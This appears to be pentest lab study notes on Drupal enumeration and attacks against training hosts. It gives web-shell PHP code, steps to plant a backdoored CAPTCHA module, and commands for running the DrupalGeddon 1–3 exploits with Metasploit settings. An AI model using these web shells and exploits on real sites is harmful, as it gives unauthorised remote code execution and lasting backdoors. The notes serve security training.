# Discovery and Enumeration
## Discovery
* Look for the header or footer message
```shell
curl -s http://drupal.inlanefreight.local | grep Drupal
```
### Nodes
* Content is index using nodes. 
```URL
http://drupal.inlanefreight.local/node/1
```
### Users
1. Administrators
2. Authenticated User
3. Anonymous
## Enumeration 
* Get the version number:
* Newer versions block access to `CHANGELOG.txt` and `README.txt`
```shell
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```
### Droopescan
```shell
droopescan scan drupal -u http://drupal.inlanefreight.local
```

# Attacking Drupal
## Leveraging the PHP Filter Module
### Pre-Version 8
* On older version you can enable `PHP Filter` module.
* Navigate to `Content > Add Content > Basic Page`
```php
<?php
system($_GET['cmd']);
?>
```
* Make the text format PHP `code`
```shell
curl -s http://drupal-qa.inlanefreight.local/node/3?cmd=id | grep uid | cut -f4 -d">"
```
### Post-Version 8
* Post version 8 the `PHP Filter` module is not installed by default. 
* Download and install manually:
```shell
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
* Navigate to `Administration > Reports > Available Updates > Browser > Install`
* Create a basic script and select `PHP code`
```php
<?php
system($_GET['cmd']);
?>
```
## Uploading a Backdoored Module 
* If you have appropriate permissions you can upload a new module with a backdoor.
### Example
* Download the CAPTCHA module
```shell
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Add a WebShell within the contents:
```php
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>
```
* Create a `.htaccess` file: 
* This gives access to the `/modules` folder
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* Copy both files and archive the folder:
```shell
 mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* `Manage > Extend > Install New Module > Install`
```shell
 curl -s drupal.inlanefreight.local/modules/captcha/shell.php?cmd=id
```
## Known Vulnerabilities 
* RCE vulnerabilities are known `DrupalGeddon`
### DrupalGeddon1 
https://www.exploit-db.com/exploits/34992
Example:
```shell
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```
* Can also be done with metasploit
* `exploit/multi/http/drupal_drupageddon`
### DrupalGeddon2
https://www.exploit-db.com/exploits/44448
```shell
python3 drupalgeddon2.py 
```
Test
```shell
curl -s http://drupal-dev.inlanefreight.local/hello.txt
```
Modify the exploit:
```shell
echo '<?php system($_GET[cmd]);?>' | base64
```
```shell
 echo <base64> | base64 -d | tee shell.php
```
```shell
python3 drupalgeddon2.py 
```
### DrupalGeddon3
https://github.com/rithchard/Drupalgeddon3
* Requires a user to have the ability to delete a node.
* Can be exploited by metasploit, but you need a session cookie 
* Login in as user and copy the cookie.
```shell
use multi/http/drupal_drupageddon3
set rhosts 10.129.42.195
set VHOST drupal-acc.inlanefreight.local   
set drupal_session <session_cookie>
set DRUPAL_NODE 1
set LHOST 10.10.14.15
show options 
```
